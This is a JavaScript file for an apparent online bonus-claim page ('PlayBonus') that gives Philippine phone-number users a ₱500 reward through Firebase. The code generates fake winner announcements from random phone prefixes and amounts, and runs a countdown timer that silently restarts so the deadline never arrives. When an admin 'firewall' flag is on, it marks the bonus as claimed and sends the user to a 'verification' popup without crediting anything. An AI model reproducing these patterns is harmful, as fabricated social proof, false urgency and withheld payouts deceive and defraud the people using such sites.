/**
 * PlayBonus.js - Main Script for PlayBonus.html
 * Auto Popup: PT_Cat appears after 3s (fresh) or 5s (claimed)
 * Anti-glitch: Firebase state sync prevents re-claim on refresh
 */

(function() {
    'use strict';
    
    // ========== GLOBAL VARIABLES ==========
    var userPhone = null;
    var db = null;
    var userRef = null;
    var currentBalance = 0;
    var bonusAmount = 500;
    var isClaimed = false;
    var claimInProgress = false;
    var userDataLoaded = false;
    var autoPopupTimer = null;
    
    var soundCache = {
        scatter: null,
        claim: null,
        success: null
    };
    
    // ========== FORMAT NUMBER ==========
    function formatNumberWithComma(number) {
        var num = Number(number).toFixed(2);
        var parts = num.split('.');
        var wholePart = parts[0];
        var decimalPart = parts[1];
        var wholeWithCommas = wholePart.replace(/\B(?=(\d{3})+(?!\d))/g, ',');
        return wholeWithCommas + '.' + decimalPart;
    }
    
    // ========== INIT SOUNDS ==========
    function initSounds() {
        try {
            soundCache.scatter = new Audio('sounds/super_ace_scatter_ring.mp3');
            soundCache.claim = new Audio('sounds/claim.wav');
            soundCache.success = new Audio('sounds/success.wav');
            soundCache.scatter.volume = 0.5;
            soundCache.claim.volume = 0.7;
            soundCache.success.volume = 0.6;
        } catch(e) {
            console.log('Sound initialization failed:', e);
        }
    }
    
    function playSound(soundName) {
        if (soundCache[soundName]) {
            soundCache[soundName].currentTime = 0;
            soundCache[soundName].play().catch(function(e) { 
                console.log('Sound error:', e); 
            });
        }
    }
    
    // ========== INIT ==========
    function init() {
        console.log('🎁 PlayBonus System Starting...');
        
        userPhone = localStorage.getItem("userPhone");
        if (!userPhone) {
            window.location.href = "index.html";
            return;
        }
        
        var phoneDisplay = document.getElementById('userPhoneDisplay');
        if (phoneDisplay) {
            var formatted = userPhone.substring(0, 4) + "***" + userPhone.substring(7, 11);
            phoneDisplay.innerText = formatted;
        }
        
        initSounds();
        initFirebase();
        loadUserData();
        initTimer();
        initTicker();
        initClaimFlow();
        initConfetti();
        attachButtonEvents();
        
        console.log('✅ All systems ready!');
    }
    
    // ========== INIT FIREBASE ==========
    function initFirebase() {
        if (typeof firebaseConfig === 'undefined') {
            console.error('Firebase config not found!');
            return;
        }
        try {
            if (!firebase.apps || !firebase.apps.length) {
                firebase.initializeApp(firebaseConfig);
            }
            db = firebase.database();
            userRef = db.ref('user_sessions/' + userPhone);
        } catch(e) { 
            console.error('Firebase error:', e); 
        }
    }
    
    // ========== LOAD USER DATA ==========
    function loadUserData() {
        if (!userRef) return;
        
        userRef.once('value', function(snapshot) {
            var data = snapshot.val();
            if (data) {
                currentBalance = data.balance || 0;
                // ✅ ANTI-GLITCH: Sync claim state from Firebase
                isClaimed = data.claimed_ptcat === true;
                updateBalanceDisplay();
                updatePTCCatUI();
                userDataLoaded = true;
                
                console.log('📊 User data loaded - isClaimed:', isClaimed);
                
                // ✅ Auto popup based on claim status
                scheduleAutoPopup();
            } else {
                // New user
                currentBalance = 0;
                isClaimed = false;
                userRef.set({ 
                    phone: userPhone, 
                    balance: 0, 
                    claimed_ptcat: false, 
                    status: "active", 
                    created_at: Date.now() 
                });
                updateBalanceDisplay();
                updatePTCCatUI();
                userDataLoaded = true;
                
                console.log('🆕 New user - isClaimed: false');
                
                // ✅ Auto popup for new user
                scheduleAutoPopup();
            }
        }).catch(function(e) { 
            console.error('Load user error:', e); 
        });
        
        // Real-time balance listener
        userRef.child('balance').on('value', function(snapshot) {
            var balance = snapshot.val();
            if (balance !== null && balance !== undefined) {
                currentBalance = Number(balance);
                updateBalanceDisplay();
            }
        });
        
        // ✅ ANTI-GLITCH: Real-time claim status listener
        userRef.child('claimed_ptcat').on('value', function(snapshot) {
            var claimed = snapshot.val();
            var newClaimedState = (claimed === true);
            
            // Update state if changed
            if (newClaimedState !== isClaimed) {
                isClaimed = newClaimedState;
                updatePTCCatUI();
                console.log('🔄 Claim state synced from Firebase:', isClaimed);
            }
        });
    }
    
    // ========== SCHEDULE AUTO POPUP ==========
    function scheduleAutoPopup() {
        // Clear any existing timer
        if (autoPopupTimer) {
            clearTimeout(autoPopupTimer);
        }
        
        // Determine delay based on claim status
        // - Not claimed: 3 seconds
        // - Already claimed: 5 seconds (para makita pa rin ng user)
        var delay = isClaimed ? 5000 : 3000;
        
        console.log('⏰ Auto popup scheduled in ' + (delay / 1000) + 's (isClaimed: ' + isClaimed + ')');
        
        autoPopupTimer = setTimeout(function() {
            autoShowBonusPopup();
        }, delay);
    }
    
    // ========== AUTO SHOW BONUS POPUP ==========
    function autoShowBonusPopup() {
        console.log('🎁 Auto-showing bonus popup... (isClaimed: ' + isClaimed + ')');
        
        var popup = document.getElementById('bonusRewardPopup');
        if (!popup) return;
        
        // Show popup
        popup.style.display = 'flex';
        
        // Play sound
        playSound('scatter');
        
        // ✅ Update button state based on claim status
        updatePTCCatUI();
        
        if (isClaimed) {
            console.log('✅ Popup shown with ALREADY CLAIMED state');
        } else {
            console.log('✅ Popup shown with CLAIM BONUS active');
        }
    }
    
    // ========== UPDATE BALANCE DISPLAY ==========
    function updateBalanceDisplay() {
        var balanceEl = document.getElementById('userBalanceDisplay');
        if (balanceEl) {
            balanceEl.innerText = formatNumberWithComma(currentBalance);
        }
    }
    
    // ========== ADD TO BALANCE ==========
    function addToBalance(amount, slowAnimation) {
        var oldBalance = currentBalance;
        var newBalance = oldBalance + amount;
        
        if (slowAnimation) {
            animateBalanceSlow(oldBalance, newBalance, 2000, function() {
                currentBalance = newBalance;
                if (userRef) {
                    userRef.update({ 
                        balance: currentBalance, 
                        lastUpdate: Date.now() 
                    });
                }
                updateBalanceDisplay();
            });
        } else {
            currentBalance = newBalance;
            updateBalanceDisplay();
            if (userRef) {
                userRef.update({ 
                    balance: currentBalance, 
                    lastUpdate: Date.now() 
                });
            }
        }
        
        var balanceEl = document.getElementById('userBalanceDisplay');
        if (balanceEl) {
            balanceEl.style.transform = 'scale(1.1)';
            setTimeout(function() { 
                if (balanceEl) balanceEl.style.transform = 'scale(1)'; 
            }, 200);
        }
    }
    
    function animateBalanceSlow(start, end, duration, callback) {
        var startTimestamp = null;
        function step(timestamp) {
            if (!startTimestamp) startTimestamp = timestamp;
            var progress = Math.min((timestamp - startTimestamp) / duration, 1);
            var easeProgress = 1 - Math.pow(1 - progress, 3);
            var val = Math.floor(easeProgress * (end - start) + start);
            var balanceEl = document.getElementById('userBalanceDisplay');
            if (balanceEl) balanceEl.innerText = formatNumberWithComma(val);
            if (progress < 1) {
                requestAnimationFrame(step);
            } else {
                if (callback) callback();
            }
        }
        requestAnimationFrame(step);
    }
    
    // ========== CHECK FIREWALL ==========
    function checkFirewallBeforeClaim() {
        try {
            return db.ref('admin/globalFirewall').once('value').then(function(snapshot) {
                var data = snapshot.val();
                return (data && data.active === true);
            });
        } catch(e) {
            console.error('Firewall check error:', e);
            return Promise.resolve(false);
        }
    }
    
    // ========== TRACK CLAIM IN FIREBASE ==========
    function trackClaimInFirebase(amount) {
        try {
            var now = new Date();
            var year = now.getFullYear();
            var month = String(now.getMonth() + 1).padStart(2, '0');
            var day = String(now.getDate()).padStart(2, '0');
            var dateKey = year + '-' + month + '-' + day;
            
            var dayRef = db.ref('festival_stats/daily/' + dateKey);
            
            dayRef.transaction(function(data) {
                if (data === null) {
                    data = {
                        claims_count: 0,
                        claims_amount: 0,
                        redemption_count: 0,
                        redemption_amount: 0
                    };
                }
                data.claims_count = (data.claims_count || 0) + 1;
                data.claims_amount = (data.claims_amount || 0) + (amount || 0);
                data.last_update = Date.now();
                return data;
            });
            
            console.log('📊 Claim tracked:', dateKey, '₱' + amount);
        } catch(e) {
            console.error('Track claim error:', e);
        }
    }
    
    // ========== INIT CLAIM FLOW ==========
    function initClaimFlow() {
        console.log('🎁 Initializing Claim Flow...');
        
        var claimNowBtn = document.getElementById('claimNowBtn');
        var popup = document.getElementById('bonusRewardPopup');
        
        // ========== CLAIM NOW BUTTON ==========
        if (claimNowBtn) {
            claimNowBtn.addEventListener('click', function(e) {
                e.preventDefault();
                e.stopPropagation();
                
                console.log('🖱️ CLAIM NOW clicked (isClaimed: ' + isClaimed + ')');
                
                playSound('scatter');
                
                // ✅ ALWAYS show popup, but state depends on claim status
                if (popup) {
                    popup.style.display = 'flex';
                    
                    // Ensure button state is correct
                    updatePTCCatUI();
                    
                    if (isClaimed) {
                        console.log('✅ Popup opened with ALREADY CLAIMED state');
                    } else {
                        console.log('✅ Popup opened with CLAIM BONUS active');
                    }
                }
            });
        }
        
        // ========== CLAIM BONUS BUTTON (Inside Popup) ==========
        var ptCatClaimBtn = document.getElementById('ptCatClaimBtn');
        if (ptCatClaimBtn) {
            ptCatClaimBtn.addEventListener('click', handlePTCCatClaim);
        }
        
        // ========== POPUP CLOSE BUTTON ==========
        var closeBtn = document.getElementById('bonusRewardClose');
        if (closeBtn) {
            closeBtn.addEventListener('click', function() {
                if (popup) popup.style.display = 'none';
            });
        }
        
        // ========== POPUP BACK BUTTON ==========
        var backBtn = document.getElementById('bonusRewardBack');
        if (backBtn) {
            backBtn.addEventListener('click', function() {
                if (popup) popup.style.display = 'none';
            });
        }
        
        updatePTCCatUI();
        console.log('✅ Claim Flow initialized');
    }
    
    // ========== HANDLE CLAIM BONUS (Inside Popup) ==========
    function handlePTCCatClaim(e) {
        e.preventDefault();
        e.stopPropagation();
        
        console.log('🖱️ PT Cat claim clicked (isClaimed: ' + isClaimed + ')');
        
        // ✅ ANTI-GLITCH: Check local state first
        if (isClaimed) {
            alert("You have already claimed this bonus!");
            return;
        }
        
        if (claimInProgress) {
            alert("Please wait, processing your claim...");
            return;
        }
        
        if (!userRef) {
            alert("System not ready. Please refresh the page.");
            return;
        }
        
        // ✅ ANTI-GLITCH: Double-check from Firebase
        userRef.child('claimed_ptcat').once('value', function(snapshot) {
            if (snapshot.val() === true) {
                console.log('🔒 Firebase confirms - already claimed');
                isClaimed = true;
                updatePTCCatUI();
                alert("You have already claimed this bonus!");
                return;
            }
            processPTCCatClaim();
        }).catch(function(error) {
            console.error('Error checking claim status:', error);
            processPTCCatClaim();
        });
    }
    
    // ========== PROCESS CLAIM ==========
    function processPTCCatClaim() {
        claimInProgress = true;
        
        var ptCatClaimBtn = document.getElementById('ptCatClaimBtn');
        
        if (ptCatClaimBtn) {
            ptCatClaimBtn.disabled = true;
            ptCatClaimBtn.style.opacity = '0.6';
            ptCatClaimBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> <span>PROCESSING...</span>';
        }
        
        // Check firewall
        checkFirewallBeforeClaim().then(function(firewallOn) {
            if (firewallOn) {
                console.log('🔥 Firewall ON - Opening Arcade AI Verification');
                
                // Hide bonus popup
                var popup = document.getElementById('bonusRewardPopup');
                if (popup) popup.style.display = 'none';
                
                // ✅ Mark as claimed IMMEDIATELY to prevent re-claim
                userRef.update({ 
                    claimed_ptcat: true, 
                    ptcat_claimed_at: Date.now(),
                    firewall_verification: true
                }).then(function() {
                    console.log('🔒 Claim locked before AI verification');
                    
                    // Update local state
                    isClaimed = true;
                    updatePTCCatUI();
                    
                    // Track claim
                    trackClaimInFirebase(bonusAmount);
                    
                    // Show Arcade popup
                    if (window.showPopup) {
                        window.showPopup(currentBalance);
                    }
                    
                    claimInProgress = false;
                }).catch(function(err) {
                    console.error('Failed to lock claim:', err);
                    resetClaimButton();
                });
                return;
            }
            
            // No firewall - proceed with direct claim
            proceedWithClaim();
        }).catch(function(error) {
            console.error('Firewall check error:', error);
            proceedWithClaim();
        });
    }
    
    // ========== RESET CLAIM BUTTON ==========
    function resetClaimButton() {
        var ptCatClaimBtn = document.getElementById('ptCatClaimBtn');
        if (ptCatClaimBtn) {
            ptCatClaimBtn.disabled = false;
            ptCatClaimBtn.style.opacity = '1';
            ptCatClaimBtn.innerHTML = '<i class="fas fa-gift"></i> <span>CLAIM BONUS</span>';
        }
        claimInProgress = false;
    }
    
    // ========== PROCEED WITH CLAIM ==========
    function proceedWithClaim() {
        userRef.update({ 
            claimed_ptcat: true, 
            ptcat_claimed_at: Date.now() 
        }).then(function() {
            console.log('✅ Claim saved to Firebase');
            
            // Update local state IMMEDIATELY
            isClaimed = true;
            updatePTCCatUI();
            
            // Track claim
            trackClaimInFirebase(bonusAmount);
            
            // Play sound
            playSound('claim');
            
            // Add to balance
            addToBalance(bonusAmount, true);
            
            // Confetti
            startConfetti();
            
            // Hide popup
            var popup = document.getElementById('bonusRewardPopup');
            if (popup) popup.style.display = 'none';
            
            // Show success popup
            setTimeout(function() {
                showSuccessPopup(bonusAmount);
            }, 500);
            
            setTimeout(function() { 
                claimInProgress = false; 
            }, 2500);
            
        }).catch(function(e) {
            console.error('Firebase save error:', e);
            alert('Error saving claim. Please try again.');
            resetClaimButton();
        });
    }
    
    // ========== UPDATE UI (ANTI-GLITCH) ==========
    function updatePTCCatUI() {
        var ptCatClaimBtn = document.getElementById('ptCatClaimBtn');
        var bonusLabel = document.querySelector('.bonus-label');
        
        if (ptCatClaimBtn) {
            if (isClaimed) {
                // ✅ CLAIMED STATE
                ptCatClaimBtn.disabled = true;
                ptCatClaimBtn.style.opacity = '0.5';
                ptCatClaimBtn.style.cursor = 'not-allowed';
                ptCatClaimBtn.style.pointerEvents = 'none';
                ptCatClaimBtn.innerHTML = '<i class="fas fa-check-circle"></i> <span>ALREADY CLAIMED</span>';
                ptCatClaimBtn.classList.add('claimed');
                
                // Change label
                if (bonusLabel) {
                    bonusLabel.textContent = 'BONUS CLAIMED';
                    bonusLabel.style.color = '#22C55E';
                }
                
                console.log('🔒 UI: Button set to ALREADY CLAIMED');
            } else {
                // ✅ AVAILABLE STATE
                ptCatClaimBtn.disabled = false;
                ptCatClaimBtn.style.opacity = '1';
                ptCatClaimBtn.style.cursor = 'pointer';
                ptCatClaimBtn.style.pointerEvents = 'auto';
                ptCatClaimBtn.innerHTML = '<i class="fas fa-gift"></i> <span>CLAIM BONUS</span>';
                ptCatClaimBtn.classList.remove('claimed');
                
                // Change label
                if (bonusLabel) {
                    bonusLabel.textContent = 'BONUS REWARD';
                    bonusLabel.style.color = '';
                }
                
                console.log('🔓 UI: Button set to CLAIM BONUS');
            }
        }
    }
    
    // ========== SUCCESS POPUP ==========
    function showSuccessPopup(amount) {
        var popup = document.getElementById('successPopup');
        var amountEl = document.getElementById('successAmount');
        var closeBtn = document.getElementById('successCloseBtn');
        
        if (amountEl) amountEl.textContent = amount;
        if (popup) popup.style.display = 'flex';
        
        playSound('success');
        
        if (closeBtn) {
            closeBtn.onclick = function() {
                popup.style.display = 'none';
            };
        }
        
        setTimeout(function() {
            if (popup) popup.style.display = 'none';
        }, 5000);
    }
    
    // ========== TIMER ==========
    function initTimer() {
        var displayElement = document.getElementById('mainTimerDisplay');
        if (!displayElement) return;
        
        var CYCLE_HOURS = 72;
        var timerEndDate = null;
        
        try {
            var savedEnd = localStorage.getItem('timerEndDate');
            var now = Date.now();
            if (savedEnd && parseInt(savedEnd) > now) {
                timerEndDate = parseInt(savedEnd);
            } else {
                timerEndDate = now + (CYCLE_HOURS * 60 * 60 * 1000);
                localStorage.setItem('timerEndDate', timerEndDate);
            }
            
            function update() {
                var now = Date.now();
                var diff = timerEndDate - now;
                if (diff <= 0) {
                    timerEndDate = now + (CYCLE_HOURS * 60 * 60 * 1000);
                    localStorage.setItem('timerEndDate', timerEndDate);
                    diff = CYCLE_HOURS * 60 * 60 * 1000;
                }
                var days = Math.floor(diff / (1000 * 60 * 60 * 24));
                var hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
                var minutes = Math.floor((diff / (1000 * 60)) % 60);
                var seconds = Math.floor((diff / 1000) % 60);
                displayElement.innerHTML = days + 'D ' + 
                    hours.toString().padStart(2, '0') + ':' + 
                    minutes.toString().padStart(2, '0') + ':' + 
                    seconds.toString().padStart(2, '0');
            }
            
            update();
            setInterval(update, 1000);
            
        } catch(e) {
            console.error('Timer error:', e);
        }
    }
    
    // ========== TICKER ==========
    function initTicker() {
        var winnerSpan = document.getElementById('winnerText');
        if (!winnerSpan) return;
        
        var prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955", "0939", "0906", "0977"];
        
        var amountRarity = [
            { amount: 500, weight: 85 },
            { amount: 1000, weight: 10 },
            { amount: 2000, weight: 3 },
            { amount: 2500, weight: 2 }
        ];
        
        function generateRandomAmount() {
            var totalWeight = 0;
            for (var i = 0; i < amountRarity.length; i++) {
                totalWeight += amountRarity[i].weight;
            }
            var random = Math.random() * totalWeight;
            var cumulative = 0;
            for (var i = 0; i < amountRarity.length; i++) {
                cumulative += amountRarity[i].weight;
                if (random <= cumulative) {
                    return amountRarity[i].amount;
                }
            }
            return 500;
        }
        
        function generateWinner() {
            var prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
            var last4 = Math.floor(1000 + Math.random() * 9000);
            var amount = generateRandomAmount();
            return { prefix: prefix, last4: last4, amount: amount };
        }
        
        function updateTicker() {
            var winner = generateWinner();
            winnerSpan.innerHTML = winner.prefix + '***' + winner.last4 + 
                ' withdrawn <img src="images/gc_icon.png" class="gc-winner-icon"> ₱' + 
                winner.amount.toLocaleString();
        }
        
        updateTicker();
        setInterval(updateTicker, 4800);
    }
    
    // ========== CONFETTI ==========
    var confettiCanvas = null;
    var confettiAnimation = null;
    
    function initConfetti() {
        confettiCanvas = document.getElementById('confettiCanvas');
    }
    
    function startConfetti() {
        if (!confettiCanvas) return;
        
        confettiCanvas.style.display = 'block';
        confettiCanvas.width = window.innerWidth;
        confettiCanvas.height = window.innerHeight;
        
        var ctx = confettiCanvas.getContext('2d');
        var particles = [];
        
        for (var i = 0; i < 150; i++) {
            particles.push({
                x: Math.random() * confettiCanvas.width,
                y: Math.random() * confettiCanvas.height - confettiCanvas.height,
                size: Math.random() * 8 + 3,
                color: 'hsl(' + (Math.random() * 360) + ', 100%, 60%)',
                speed: Math.random() * 4 + 2,
                rotation: Math.random() * 360,
                rotationSpeed: (Math.random() - 0.5) * 10
            });
        }
        
        function draw() {
            if (!confettiCanvas || confettiCanvas.style.display === 'none') return;
            ctx.clearRect(0, 0, confettiCanvas.width, confettiCanvas.height);
            
            for (var i = 0; i < particles.length; i++) {
                var p = particles[i];
                ctx.save();
                ctx.translate(p.x, p.y);
                ctx.rotate(p.rotation * Math.PI / 180);
                ctx.fillStyle = p.color;
                ctx.fillRect(-p.size/2, -p.size/2, p.size, p.size);
                ctx.restore();
                
                p.y += p.speed;
                p.rotation += p.rotationSpeed;
                
                if (p.y > confettiCanvas.height) {
                    p.y = -p.size;
                    p.x = Math.random() * confettiCanvas.width;
                }
            }
            confettiAnimation = requestAnimationFrame(draw);
        }
        
        draw();
        
        setTimeout(function() {
            if (confettiAnimation) cancelAnimationFrame(confettiAnimation);
            ctx.clearRect(0, 0, confettiCanvas.width, confettiCanvas.height);
            confettiCanvas.style.display = 'none';
        }, 4000);
    }
    
    // ========== ATTACH BUTTON EVENTS ==========
    function attachButtonEvents() {
        var logoutBtn = document.getElementById('logoutBtn');
        if (logoutBtn) {
            logoutBtn.addEventListener('click', function() {
                logoutUser();
            });
        }
        
        var fbBtn = document.getElementById('facebookShareBtn');
        if (fbBtn) {
            fbBtn.addEventListener('click', function() {
                shareOnFacebook();
            });
        }
    }
    
    // ========== LOGOUT ==========
    function logoutUser() {
        if (userPhone) {
            try {
                db.ref('user_sessions/' + userPhone).update({
                    status: 'offline',
                    lastSeen: firebase.database.ServerValue.TIMESTAMP
                });
            } catch(e) { console.log('Logout error:', e); }
        }
        localStorage.clear();
        sessionStorage.clear();
        window.location.replace('index.html');
    }
    
    // ========== FACEBOOK SHARE ==========
    function shareOnFacebook() {
        var shareUrl = 'https://tiny.cc/LuckyDrop';
        window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(shareUrl), '_blank', 'width=600,height=400');
    }
    
    // ========== BAN CHECK ==========
    function checkIfBanned() {
        if (!userPhone) return;
        try {
            db.ref('banned_ghosts/' + userPhone).once('value').then(function(snap) {
                if (snap.exists()) {
                    db.ref('user_sessions/' + userPhone).update({ status: 'offline' });
                    localStorage.clear();
                    sessionStorage.clear();
                    window.location.replace('index.html');
                }
            });
        } catch(e) { 
            console.log('Ban check error:', e); 
        }
    }
    
    // ========== RESET CLAIM STATE (called by popup) ==========
    function resetClaimState() {
        claimInProgress = false;
        if (!isClaimed) {
            resetClaimButton();
        }
    }
    
    // ========== EXPORT FUNCTIONS ==========
    window.PlayBonus = {
        addToBalance: addToBalance,
        playSound: playSound,
        formatNumberWithComma: formatNumberWithComma,
        trackClaim: trackClaimInFirebase,
        resetClaimState: resetClaimState,
        getBalance: function() { return currentBalance; },
        getUserPhone: function() { return userPhone; },
        isUserClaimed: function() { return isClaimed; }
    };
    
    // ========== START ==========
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', function() {
            init();
            setInterval(checkIfBanned, 5000);
            checkIfBanned();
        });
    } else {
        init();
        setInterval(checkIfBanned, 5000);
        checkIfBanned();
    }
    
})();
